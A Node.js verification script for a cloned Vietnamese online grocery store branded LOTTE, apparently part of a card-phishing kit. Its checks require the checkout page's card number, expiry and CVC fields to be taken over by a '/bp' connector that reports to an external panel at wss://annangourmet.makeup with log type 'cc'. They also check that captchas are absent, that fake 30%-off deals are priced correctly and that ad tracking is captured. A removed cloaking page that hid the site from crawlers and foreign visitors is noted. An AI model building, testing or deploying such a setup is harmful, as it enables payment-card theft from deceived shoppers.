#!/usr/bin/env node
/**
 * 契约自检（《建站结账页契约》v1.0 §9 十条 + 本项目追加项）
 *
 *   npm run dev            # 另开一个终端
 *   npm run verify         # 默认 http://127.0.0.1:5411
 *   node scripts/verify-contract.mjs http://127.0.0.1:5411
 */
const BASE = (process.argv[2] || 'http://127.0.0.1:5411').replace(/\/$/, '');

let pass = 0;
const fails = [];
const notes = [];

const ok = (name, cond, extra = '') => {
  if (cond) {
    pass++;
    console.log(`  ✓ ${name}`);
  } else {
    fails.push(name + (extra ? ` — ${extra}` : ''));
    console.log(`  ✗ ${name}${extra ? ' — ' + extra : ''}`);
  }
};

const get = async (path, init) => {
  const res = await fetch(BASE + path, { redirect: 'manual', ...(init || {}) });
  const text = await res.text();
  return { res, text, status: res.status, headers: res.headers };
};

const head = async (path) => {
  const res = await fetch(BASE + path, { method: 'GET', redirect: 'manual' });
  return { status: res.status, headers: res.headers, text: await res.text() };
};

const section = (n) => console.log(`\n${n}`);

const main = async () => {
  console.log(`[verify] ${BASE}`);

  /* ---------------- 1. /checkout 路由 ---------------- */
  section('1. /checkout 路由（契约 §2 / §9-1）');
  const co = await head('/checkout');
  ok('/checkout 返回 200', co.status === 200, `status=${co.status}`);
  ok('/checkout 无 Location 头（不 301/302）', !co.headers.get('location'), co.headers.get('location') || '');
  const csp = co.headers.get('content-security-policy') || '';
  ok('CSP 存在', Boolean(csp));
  ok("connect-src 含 wss://annangourmet.makeup", /connect-src[^;]*wss:\/\/annangourmet\.makeup/.test(csp));
  ok("frame-src 放行 https://annangourmet.makeup", /frame-src[^;]*https:\/\/annangourmet\.makeup/.test(csp));
  ok("script-src 含 'unsafe-inline'", /script-src[^;]*'unsafe-inline'/.test(csp));
  ok('script-src 不含 nonce-', !/script-src[^;]*nonce-/.test(csp));
  ok('script-src 不含 sha256-', !/script-src[^;]*sha256-/.test(csp));
  ok("base-uri 含 'self'", /base-uri[^;]*'self'/.test(csp));
  ok('无 sandbox 指令', !/(^|;)\s*sandbox/.test(csp));
  ok('无 require-trusted-types-for', !/require-trusted-types-for/.test(csp));
  ok('无 X-Frame-Options: DENY', (co.headers.get('x-frame-options') || '').toUpperCase() !== 'DENY');
  ok('X-Content-Type-Options: nosniff', (co.headers.get('x-content-type-options') || '') === 'nosniff');

  /* ---------------- 2. /bp 资源 ---------------- */
  section('2. /bp 接管包（契约 §2 / §9-2 §9-3）');
  const bpFiles = [
    '/bp/connector.js',
    '/bp/connector.css',
    '/bp/config.json',
    '/bp/socket.io.min.js',
    '/bp/bp-template-runtime.js',
    '/bp/3ds/img/visa.svg',
    '/bp/3ds/img/mastercard.svg',
    '/bp/3ds/img/3d-secure-mastercard.png',
    '/bp/3ds/img/3d-secure-ae.png',
    '/bp/3ds/img/3d-secure-jcb.png',
    '/bp/3ds/img/3d-secure-dir.png',
  ];
  for (const f of bpFiles) {
    const r = await head(f);
    ok(`${f} 200`, r.status === 200, `status=${r.status}`);
  }
  const cfg = JSON.parse((await head('/bp/config.json')).text);
  ok("config.panel_host = wss://annangourmet.makeup", cfg.panel_host === 'wss://annangourmet.makeup', cfg.panel_host);
  ok("config.logtype = cc", cfg.logtype === 'cc', cfg.logtype);
  ok('config.allow_direct = false（直通关闭）', cfg.allow_direct === false, String(cfg.allow_direct));
  ok("config.guard_mode = always", cfg.guard_mode === 'always', cfg.guard_mode);
  ok('config.submit_url = /api/checkout', cfg.submit_url === '/api/checkout', cfg.submit_url);
  ok('config.cart_url = /api/cart', cfg.cart_url === '/api/cart', cfg.cart_url);
  ok(
    'connector 版本 20261125（已移除自带像素：无 pixel_enabled / 无 bp:pixel）',
    typeof cfg.pixel_enabled === 'undefined',
    `pixel_enabled=${String(cfg.pixel_enabled)}`
  );

  /* ---------------- 3. 结账页 head 三段顺序 ---------------- */
  section('3. 结账页 head 顺序（契约 §3）');
  const html = co.text;
  const iUtm = html.indexOf("'utm_source'");
  const iCart = html.indexOf('window.__BP_CART__');
  const iConn = html.indexOf('/bp/connector.js');
  ok('UTM 捕获脚本存在', iUtm > 0);
  ok('__BP_CART__ 骨架存在', iCart > 0);
  ok('connector.js 存在', iConn > 0);
  ok('顺序：UTM → __BP_CART__ → connector', iUtm < iCart && iCart < iConn, `${iUtm}/${iCart}/${iConn}`);
  ok('无 <base> 标签', !/<base\s/i.test(html));
  ok('connector 用绝对路径 /bp/', html.includes('href="/bp/connector.css"') && html.includes('src="/bp/connector.js"'));
  ok('无 ./bp/ 相对引用', !html.includes('./bp/'));
  ok('无 Service Worker 注册', !/serviceWorker\.register/.test(html));
  ok('无验证码（turnstile/recaptcha/hcaptcha）', !/turnstile|recaptcha|hcaptcha/i.test(html));

  /* ---------------- 4. 六个固定 id ---------------- */
  section('4. 结账页 DOM（契约 §4）');
  for (const id of ['bp-card-number', 'bp-card-expiry', 'bp-card-cvc', 'bp-total', 'bp-error', 'bp-submit']) {
    ok(`#${id} 存在`, new RegExp(`id="${id}"`).test(html));
  }
  ok('卡号 type="text"（非 number）', /id="bp-card-number"[^>]*type="text"/.test(html));
  ok('卡号 inputmode="numeric"', /id="bp-card-number"[^>]*inputmode="numeric"/.test(html));
  ok('autocomplete="cc-number"', /autocomplete="cc-number"/.test(html));
  ok('autocomplete="cc-exp"', /autocomplete="cc-exp"/.test(html));
  ok('autocomplete="cc-csc"', /autocomplete="cc-csc"/.test(html));
  ok('卡片字段容器 .bp-card-fields', /class="bp-card-fields"/.test(html));
  ok('#bp-error 常驻且无 display:none', !/id="bp-error"[^>]*style="[^"]*display:\s*none/.test(html));
  ok('#bp-error 有 role=alert', /id="bp-error"[^>]*role="alert"/.test(html));
  ok('#bp-submit 是 submit 按钮', /id="bp-submit"[^>]*type="submit"/.test(html));
  ok('#bp-submit 未 disabled', !/id="bp-submit"[^>]*\sdisabled/.test(html));
  ok('form 无 action 属性', /<form id="bp-form"[^>]*>/.test(html) && !/<form id="bp-form"[^>]*action=/.test(html));
  ok('页面 lang 存在', /<html lang="vi">/.test(html));

  /* ---------------- 5. UTM 参数 ---------------- */
  section('5. UTM 捕获（契约 §9-4）');
  const utm = await head('/checkout?utm_source=fb&adset_id=123');
  ok('页面源码含 bp_utm', utm.text.includes('bp_utm'));
  ok('UTM 参数键表含 adset_id', utm.text.includes("'adset_id'"));
  ok('UTM 参数键表含 fbclid', utm.text.includes("'fbclid'"));

  /* ---------------- 6. 接口 ---------------- */
  section('6. /api/cart + /api/checkout（契约 §5.2 / §6.1）');
  const cart = await get('/api/cart');
  ok('/api/cart 200', cart.status === 200);
  let cj = null;
  try {
    cj = JSON.parse(cart.text);
  } catch (e) {}
  ok('/api/cart 返回 JSON', Boolean(cj));
  if (cj) {
    ok('/api/cart 字段齐全', ['order_number', 'currency', 'total', 'total_amount', 'items', 'locale'].every((k) => k in cj));
    ok('/api/cart.currency = VND', cj.currency === 'VND', cj.currency);
    ok('/api/cart.total 是整数', Number.isInteger(cj.total), String(cj.total));
  }

  const orderNo = 'ORD-VERIFY-0001';
  const post = await get('/api/checkout', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Origin: BASE },
    body: JSON.stringify({ order_number: orderNo, amount: 129900, currency: 'VND', locale: 'vi', utm: { utm_source: 'verify' } }),
  });
  ok('/api/checkout 200', post.status === 200, `status=${post.status}`);
  ok('/api/checkout 无 Location（不跳转）', !post.headers.get('location'));
  let pj = null;
  try {
    pj = JSON.parse(post.text);
  } catch (e) {}
  ok('/api/checkout 返回 JSON', Boolean(pj));
  ok('/api/checkout ok:true', pj && pj.ok === true);
  ok('/api/checkout 单号原样回传', pj && pj.order_number === orderNo, pj && pj.order_number);
  const post2 = await get('/api/checkout', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Origin: BASE },
    body: JSON.stringify({ order_number: orderNo, amount: 129900, currency: 'VND' }),
  });
  const pj2 = JSON.parse(post2.text);
  ok('/api/checkout 幂等（同号重复 POST 仍 ok:true）', pj2.ok === true && pj2.order_number === orderNo);
  const bad = await get('/api/checkout', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Origin: BASE },
    body: JSON.stringify({ order_number: '', amount: 0 }),
  });
  const bj = JSON.parse(bad.text);
  ok('非法请求仍 200 + ok:false + error_code', bad.status === 200 && bj.ok === false && Boolean(bj.error_code));

  /* ---------------- 7. /order 成功页 ---------------- */
  section('7. /order/<no>（契约 §2 / R3）');
  const ord = await head('/order/ORD-VERIFY-0001');
  ok('/order/<no> 200', ord.status === 200, `status=${ord.status}`);
  ok('/order/<no> 无 Location', !ord.headers.get('location'));

  /* ---------------- 8. 页面与数据 ---------------- */
  section('8. 页面与数据完整性');
  const pages = ['/', '/cart', '/search?q=sua', '/login', '/register', '/account', '/vi-nsg/privacy', '/vi-nsg/membership-policy', '/vi-nsg/about-us', '/vi-nsg/faq', '/vi-nsg/shipping-delivery', '/vi-nsg/exchange-refund', '/vi-nsg/cookies-policy', '/vi-nsg/account-management'];
  for (const p of pages) {
    const r = await head(p);
    ok(`${p} 200`, r.status === 200, `status=${r.status}`);
  }

  const menu = JSON.parse((await head('/data/menu.json')).text);
  ok('类目树 ≥ 380 个有效节点（空类目已过滤）', (menu.nodes || []).length >= 380, String((menu.nodes || []).length));
  ok('一级类目 26 个', (menu.roots || []).length === 26, String((menu.roots || []).length));

  const meta = JSON.parse((await head('/data/meta.json')).text);
  ok('商品数 > 14000', meta.products > 14000, String(meta.products));
  notes.push(`商品 ${meta.products} / 类目 ${meta.categories} / 真实评价 ${meta.reviewsReal}`);

  const cat = JSON.parse((await head('/data/cat/3.json')).text);
  ok('类目 3（Rau Củ）有商品', (cat.items || []).length > 0, String((cat.items || []).length));
  ok('卡片字段齐全', ['id', 'n', 'u', 'im', 'p', 'l', 'r', 'rv'].every((k) => k in (cat.items[0] || {})));

  const home = JSON.parse((await head('/data/home.json')).text);
  ok('首页有主视觉轮播', (home.hero || []).length > 0, String((home.hero || []).length));
  ok('首页有商品区块', (home.sections || []).length >= 4, String((home.sections || []).length));
  ok('首页有优惠券', (home.coupons || []).length > 0, String((home.coupons || []).length));

  /* ---------------- AppLovin（Axon）Pixel ---------------- */
  const axCfg = (await head('/assets/config.js')).text;
  ok('config.js 有 applovin 配置块', /applovin\s*:/.test(axCfg) && /eventKey/.test(axCfg));
  const axJs = await head('/assets/axpixel.js');
  ok('AppLovin 像素脚本可取', axJs.status === 200 && /axon/.test(axJs.text), `status=${axJs.status}`);
  /* AppLovin 后台的“网站是否装了像素”是抓 HTML 源码判断的，所以源码里必须有这两样 */
  const axHtml = (await head('/')).text;
  ok(
    'HTML 源码含官方安装片段（AXON_EVENT_KEY + s.axon.ai/pixel.js）',
    /AXON_EVENT_KEY/.test(axHtml) && /s\.axon\.ai\/pixel\.js/.test(axHtml),
    `AXON_EVENT_KEY=${/AXON_EVENT_KEY/.test(axHtml)} s.axon.ai=${/s\.axon\.ai\/pixel\.js/.test(axHtml)}`
  );
  ok('HTML 源码里 Event Key 已填入', /var AXON_EVENT_KEY = '[0-9a-f-]{20,}'/.test(axHtml));
  const axHome = await head('/');
  ok('CSP 放行 s.axon.ai（script-src + connect-src）', (() => {
    const csp = axHome.headers.get('content-security-policy') || '';
    return /script-src[^;]*https:\/\/s\.axon\.ai/.test(csp) && /connect-src[^;]*axon\.ai/.test(csp);
  })(), (axHome.headers.get('content-security-policy') || '').slice(0, 80));

  /* ---------------- 3折专区（首页人工精选） ---------------- */
  const deals = JSON.parse((await head('/data/deals.json')).text);
  ok('3折专区数据可取', Array.isArray(deals.items) && deals.items.length > 0, `items=${(deals.items || []).length}`);
  ok('3折专区有标题与副标题', Boolean(deals.title) && Boolean(deals.subtitle), `${deals.title} / ${deals.subtitle}`);
  ok(
    '3折专区每张卡字段齐全',
    (deals.items || []).every((x) => x.i && x.n && x.u && /^\/vi-nsg\/product\//.test(x.u) && x.p > 0)
  );
  const dealShard = deals.items && deals.items.length ? JSON.parse((await head(`/data/p/${Number(deals.items[0].i) % 100}.json`)).text) : {};
  ok('3折专区商品有详情页数据', Boolean(dealShard[String(deals.items?.[0]?.i)]), `id=${deals.items?.[0]?.i}`);
  ok(
    '专区商品价格 = 标价 3 折（其余商品不打折）',
    (deals.items || []).every((x) => Math.abs(x.p / x.l - 0.3) < 0.03),
    (deals.items || [])
      .filter((x) => Math.abs(x.p / x.l - 0.3) >= 0.03)
      .map((x) => `${x.i}:${x.p}/${x.l}`)
      .join(', ') || 'ok'
  );
  const dealDetail = dealShard[String(deals.items?.[0]?.i)] || {};
  ok('专区商品详情页也是 3 折', dealDetail.price === deals.items?.[0]?.p, `${dealDetail.price}/${deals.items?.[0]?.p}`);

  const prodShard = JSON.parse((await head(`/data/p/${Number(cat.items[0].id) % 100}.json`)).text);
  const prod = prodShard[String(cat.items[0].id)];
  ok('商品详情分片可取', Boolean(prod));
  if (prod) {
    ok('详情含图集', (prod.gallery || []).length > 0);
    ok('详情含价格（整数 ₫）', Number.isInteger(prod.price) && prod.price > 0);
    ok('普通商品按源站标价（不打折）', prod.price === prod.list, `${prod.price}/${prod.list}`);
  }

  const revShard = JSON.parse((await head(`/data/reviews/${Number(cat.items[0].id) % 100}.json`)).text);
  const rev = revShard[String(cat.items[0].id)];
  ok('评价分片可取', Boolean(rev && rev.items));
  ok('评价含评分与条数', rev && typeof rev.avg === 'number' && typeof rev.count === 'number');

  /* ---------------- 9. 禁止清单（契约 §8） ---------------- */
  section('9. 禁止清单（契约 §8）');
  const css = (await head('/assets/base.css')).text;
  ok('CSS 无 iframe{display:none}', !/iframe\s*\{[^}]*display\s*:\s*none/i.test(css));
  ok('CSS 无 *{pointer-events:none}', !/\*\s*\{[^}]*pointer-events\s*:\s*none/i.test(css));
  const idx = await head('/');
  ok('首页无 <base>', !/<base\s/i.test(idx.text));
  ok('首页无 service worker', !/serviceWorker\.register/.test(idx.text));

  /* ---------------- 10. 分流已撤下：所有访客同一真站 ---------------- */
  section('11. 无分流（安全页已撤）');
  const overseaHome = await head('/?country=JP');
  ok('海外 IP 也直接出真站首页', overseaHome.status === 200 && /LOTTE/i.test(overseaHome.text));
  ok('不再返回安全页内容', !/Terms of Service/.test(overseaHome.text));
  const botHome = await head('/?bot=1');
  ok('爬虫 UA 也直接出真站', /LOTTE/i.test(botHome.text) && !/Online Store/i.test(botHome.text));
  const jpData = await head('/data/home.json?country=JP');
  ok('商品数据对海外可见（不再 404）', jpData.status === 200, `status=${jpData.status}`);
  const safeGone = await head('/safe');
  ok('安全页已删除（404）', safeGone.status === 404, `status=${safeGone.status}`);

  /* ---------------- 11. 头/缓存 ---------------- */
  section('12. 响应头与缓存');
  const idxH = idx.headers;
  ok('首页 CSP 存在', Boolean(idxH.get('content-security-policy')));
  ok('首页 Referrer-Policy', Boolean(idxH.get('referrer-policy')));
  ok('首页 Permissions-Policy', Boolean(idxH.get('permissions-policy')));

  /* ---------------- 结果 ---------------- */
  console.log(`\n[verify] pass=${pass} fail=${fails.length}`);
  if (notes.length) console.log('[verify] ' + notes.join(' · '));
  if (fails.length) {
    console.log('\n失败项：');
    fails.forEach((f) => console.log('  - ' + f));
    process.exit(1);
  }
};

main().catch((e) => {
  console.error('[verify] 异常：', e);
  process.exit(1);
});
